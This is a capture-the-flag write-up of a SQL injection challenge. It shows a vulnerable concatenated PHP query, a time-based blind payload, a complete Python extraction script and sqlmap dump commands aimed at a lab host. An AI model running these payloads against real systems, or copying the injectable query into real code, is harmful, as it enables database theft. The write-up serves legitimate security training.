# SQL Injection

For this challenge, it asks us to do a sql injection to a form 
## Web First Look :

![image-20240824230451725](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240824230451725.png)

```mysql
$query_string = "SELECT * FROM melody_bu_shi_ji_lao WHERE id = " . $_GET['questionid'];
```

After seing this, I'm testing the most basic injection that is **1 or 1=1** and It printed out all 0-7 output

![21](C:\Users\ASUS\Desktop\Write Ups\images\21.png)

For the next step I then try to inject the time base attack and it work out with this format

```python
1 AND IF(ASCII(SUBSTRING(database(), 1, 1)) = 97, SLEEP(5), 0)
```

and it waited for 5 seconds, meaning the form is vulnerable to time based attacks, next step is to use python to retrieve the name of the database

```python
import requests
import time

# URL of the vulnerable page
url = "http://10.214.160.13:10002/"

# Set the parameter name that is vulnerable
param_name = "questionid"

# Function to extract a single character at a specific position
def extract_character(position, query):
    for ascii_value in range(32, 128):  # ASCII range for printable characters
        # Craft the payload to extract the character
        payload = f"1 AND IF(ASCII(SUBSTRING(({query}), {position}, 1)) = {ascii_value}, SLEEP(5), 0)"
        
        # Prepare the data for the GET request
        params = {param_name: payload}

        # Record the start time
        start_time = time.time()

        # Send the GET request
        response = requests.get(url, params=params)

        # Calculate the elapsed time
        elapsed_time = time.time() - start_time

        # Check if the elapsed time indicates a successful extraction
        if elapsed_time > 4:  # Adjust threshold if necessary
            return chr(ascii_value)
    
    return None

# Function to extract a table name
def extract_table_name(offset):
    query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='aaa_web2' LIMIT 1 OFFSET {offset}"
    table_name = ""
    for position in range(1, 50):  # Assuming table names are less than 50 characters
        character = extract_character(position, query)
        if character:
            table_name += character
            print(f"Extracted character at position {position}: {character}")
        else:
            print(f"No more characters found at position {position}. Extraction complete.")
            break
    return table_name

# Extract all table names
offset = 0
while True:
    table_name = extract_table_name(offset)
    if table_name:
        print(f"Extracted table name: {table_name}")
        offset += 1
    else:
        print("No more tables found.")
        break

```

After running this code, we can see the database name

![image-20240824231049086](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240824231049086.png)

data base name is **aaa_web2**, let's use sql map to retreive the data inside the database, the website gives us clues where the flag is hidden inside the flag_is_here table, 

so the command should be 

```bash
sqlmap -u "http://10.214.160.13:10002/?questionid=1" -D aaa_web2 -T flag_is_here --columns
```

after running this command on terminal, 

![image-20240824231353042](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240824231353042.png)

We extracted 3 column, and now let's extract the column value of flag

```bash
sqlmap -u "http://10.214.160.13:10002/?questionid=1" -D aaa_web2 -T flag_is_here -C flag --dump
```

![image-20240824231509400](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240824231509400.png)

And we receive the flag.

**flag: AAA{welc0me_to_AAA_Congratu1ationS_qq_group_386796080}**